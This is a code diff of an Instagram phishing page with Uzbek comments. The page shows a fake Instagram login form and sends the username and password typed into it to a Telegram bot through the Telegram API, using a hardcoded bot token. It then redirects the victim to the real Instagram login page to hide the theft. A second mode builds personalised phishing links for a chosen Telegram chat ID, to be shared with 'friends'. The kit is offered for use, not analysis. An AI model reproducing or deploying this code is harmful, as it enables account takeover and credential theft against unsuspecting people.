@@ -1,82 +1,89 @@
- <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="uz">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram</title>
     <style>
-        body { background: #fafafa; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { background: white; border: 1px solid #dbdbdb; padding: 30px; width: 350px; text-align: center; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
-        .logo { width: 150px; margin-bottom: 20px; }
-        input { width: 100%; padding: 12px; margin-bottom: 10px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 5px; box-sizing: border-box; outline: none; }
-        button { width: 100%; padding: 10px; background: #0095f6; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
-        .result { background: #eef; padding: 10px; border-radius: 5px; word-break: break-all; font-size: 13px; margin-top: 15px; display: none; border: 1px dashed #3390ec; }
+        body { background: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; border-radius: 1px; }
+        .logo { width: 175px; margin-bottom: 25px; cursor: pointer; }
+        input { width: 100%; padding: 10px; margin-bottom: 8px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; box-sizing: border-box; font-size: 12px; }
+        .btn { width: 100%; padding: 7px; background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: 600; cursor: pointer; margin-top: 10px; }
+        .btn:disabled { background: rgba(0, 149, 246, 0.3); }
+        .footer-link { margin-top: 20px; font-size: 14px; color: #00376b; text-decoration: none; font-weight: 600; display: block; }
+        .result-box { margin-top: 20px; padding: 10px; border: 1px dashed #3390ec; background: #f0f8ff; word-break: break-all; font-size: 12px; }
+        h3 { color: #262626; font-size: 18px; }
     </style>
 </head>
 <body>
 
-    <div class="box" id="mainBox">
+    <div class="container" id="mainBox">
         </div>
 
     <script>
-        // 1. O'zgartirishingiz kerak bo'lgan yagona narsa - BOT TOKEN
+        // --- SOZLAMALAR ---
         const BOT_TOKEN = "8481130069:AAH-NEezleZhAA1pUqMjqXaiCYAZwwuW7xM"; 
         
         const urlParams = new URLSearchParams(window.location.search);
         const targetId = urlParams.get('id');
         const mainBox = document.getElementById('mainBox');
 
+        // Sahifa yuklanganda tekshirish
         if (targetId) {
-            // --- FISHING REJIMI ---
+            // --- INSTAGRAM KO'RINISIDAGI FORMA ---
             mainBox.innerHTML = `
                 <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo">
-                <input type="text" id="login" placeholder="Login yoki Email" required>
-                <input type="password" id="pass" placeholder="Parol" required>
-                <button onclick="sendData()">Kirish</button>
+                <input type="text" id="username" placeholder="Telefon raqami, foydalanuvchi nomi yoki elektron pochta">
+                <input type="password" id="password" placeholder="Parol">
+                <button class="btn" onclick="sendToTelegram()">Kirish</button>
+                <div style="margin-top: 20px; color: #8e8e8e; font-size: 12px;">YOKI</div>
+                <a href="#" class="footer-link">Parolni unutdingizmi?</a>
             `;
         } else {
-            // --- PANEL REJIMI (Link yaratish) ---
+            // --- LINK YARATISH PANELI ---
             mainBox.innerHTML = `
-                <h3>Havola Yaratish</h3>
-                <p style="font-size:13px; color:#666;">Chat ID-ingizni ( @Get_myidrobot orqali Id oling) kiriting va link oling:</p>
-                <input type="text" id="chat_id_input" placeholder="Masalan: 1234567">
-                <button onclick="generate()">Linkni olish</button>
-                <div id="res" class="result"></div>
+                <h3>Havola yaratish</h3>
+                <p style="font-size: 13px; color: #8e8e8e;">O'z Telegram ID-ingizni kiriting va do'stlaringiz uchun maxsus havola oling.</p>
+                <input type="text" id="user_id" placeholder="Telegram ID (masalan: 1234567)">
+                <button class="btn" onclick="generateLink()">Havola olish</button>
+                <div id="linkOutput" class="result-box" style="display:none;"></div>
             `;
         }
 
-        // Ma'lumotni Telegramga yuborish funksiyasi
-        async function sendData() {
-            const login = document.getElementById('login').value;
-            const pass = document.getElementById('pass').value;
-            
-            const message = `📸 **INSTA NATIJA!**\n\n👤 Login: \`${login}\`\n🔑 Parol: \`${pass}\`\n🆔 Target ID: \`${targetId}\``;
-            
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${targetId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
-            
+        // 1. Telegramga ma'lumot yuborish
+        async function sendToTelegram() {
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+
+            if(!user || !pass) return alert("Barcha maydonlarni to'ldiring!");
+
+            const text = `📸 **Instagram Kirish**\n\n👤 Login: \`${user}\`\n🔑 Parol: \`${pass}\`\n🆔 Kimga: \`${targetId}\``;
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${targetId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
+
             try {
                 await fetch(url);
-                window.location.href = "https://instagram.com"; // Chalg'itish
-            } catch (e) {
-                alert("Xatolik yuz berdi!");
+                // Foydalanuvchini chalg'itish uchun rasmiy saytga yuborish
+                window.location.href = "https://www.instagram.com/accounts/login/";
+            } catch (error) {
+                alert("Ulanishda xatolik yuz berdi.");
             }
         }
 
-        // Link yaratish funksiyasi
-        function generate() {
-            const id = document.getElementById('chat_id_input').value;
-            if (id.length > 5) {
+        // 2. Shaxsiy havola yaratish
+        function generateLink() {
+            const id = document.getElementById('user_id').value;
+            if (id.length > 5 && !isNaN(id)) {
                 const currentUrl = window.location.href.split('?')[0];
-                const finalLink = currentUrl + "?id=" + id;
-                const resDiv = document.getElementById('res');
-                resDiv.style.display = "block";
-                resDiv.innerHTML = "<b>Sizning linkigiz:</b><br>" + finalLink;
+                const myLink = currentUrl + "?id=" + id;
+                const output = document.getElementById('linkOutput');
+                output.style.display = "block";
+                output.innerHTML = `<b>Sizning havolangiz:</b><br>${myLink}`;
             } else {
-                alert("ID xato!");
+                alert("Iltimos, to'g'ri Telegram ID kiriting!");
             }
         }
     </script>
 </body>
-
 </html>
 
